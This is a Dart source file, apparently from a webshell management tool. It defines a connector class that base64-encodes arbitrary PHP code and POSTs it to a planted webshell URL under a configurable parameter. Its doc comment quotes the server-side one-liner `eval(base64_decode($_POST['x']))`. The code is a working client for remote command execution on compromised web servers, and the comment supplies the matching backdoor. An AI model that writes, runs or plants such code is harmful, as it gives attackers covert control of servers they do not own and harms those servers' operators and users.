import 'dart:async';
import 'dart:convert';

import 'package:http/http.dart' as http;

import 'php_eval_connector.dart';

/// `php_b64rot13_post.php`：`eval(base64_decode($_POST['x']))`
///
/// 与 PhpEvalConnector 能力完全相同，区别仅在传输编码：
///   - 参数名默认为 `x`（可通过 password 字段覆盖）
///   - 值为 base64 编码后的 PHP 代码
class PhpB64Rot13Connector extends PhpEvalConnector {
  PhpB64Rot13Connector(super.webshell);

  @override
  Future<String> sendPhpCode(String phpCode) async {
    try {
      final uri = Uri.parse(webshell.url);
      // payload 参数名默认 x；用 password 字段可覆盖为自定义名
      final param =
          webshell.password?.isNotEmpty == true ? webshell.password! : 'x';
      final encoded = base64.encode(utf8.encode(phpCode));

      final response = await http
          .post(
            uri,
            headers: {'Content-Type': 'application/x-www-form-urlencoded'},
            body: {param: encoded},
          )
          .timeout(const Duration(seconds: 15));

      if (response.statusCode == 200) return response.body;
      final snippet = response.body.length > 512
          ? '${response.body.substring(0, 512)}...'
          : response.body;
      return '[HTTP ${response.statusCode}] 请求失败\n$snippet';
    } on TimeoutException {
      return '[Timeout] 连接超时';
    } on http.ClientException catch (e) {
      return '[Connection Error] ${e.message}';
    } catch (e) {
      return '[Error] $e';
    }
  }
}
